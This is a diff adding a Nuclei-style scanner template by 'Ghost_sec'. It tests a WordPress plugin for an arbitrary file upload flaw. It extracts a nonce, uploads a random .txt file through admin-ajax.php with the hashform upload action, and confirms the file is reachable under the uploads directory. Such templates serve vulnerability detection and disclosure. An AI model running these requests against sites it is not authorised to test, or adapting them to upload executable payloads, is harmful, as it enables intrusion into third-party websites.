@@ -1,0 +1,52 @@
+id: VULN-DETECTED
+
+ # ________.__                    __                          
+ #/  _____/|  |__   ____  _______/  |_    ______ ____   ____  
+#/   \  ___|  |  \ /  _ \/  ___/\   __\  /  ___// __ \_/ ___\ 
+#\    \_\  \   Y  (  <_> )___ \  |  |    \___ \\  ___/\  \___ 
+ #\______  /___|  /\____/____  > |__|   /____  >\___  >\___  >
+        #\/     \/           \/              \/     \/     \/ 
+
+info:
+  name: Arbitrary File Upload [Wordpress vulnerability]
+  author: Ghost_sec #Master of Exploit
+  severity: critical
+
+variables:
+  filename: "{{rand_base(5)}}"
+  num: "{{rand_int(1000, 9999)}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP /1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+      - |
+        POST /wp-admin/admin-ajax.php?action=hashform_file_upload_action&file_uploader_nonce={{nonce}}&allowedExtensions%5B0%5D=txt&sizeLimit=1048576&qqfile={{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {{md5(num)}}
+
+      - |
+        GET /wp-content/uploads/hashform/temp/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body_2,"success","true","url") && status_code_2 == 200'
+          - 'contains(body_3,"{{md5(num)}}") && status_code_3 == 200'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: nonce
+        part: body
+        group: 1
+        regex:
+          - '"ajax_nounce":"([0-9a-z]+)","preview_img'
+        internal: true
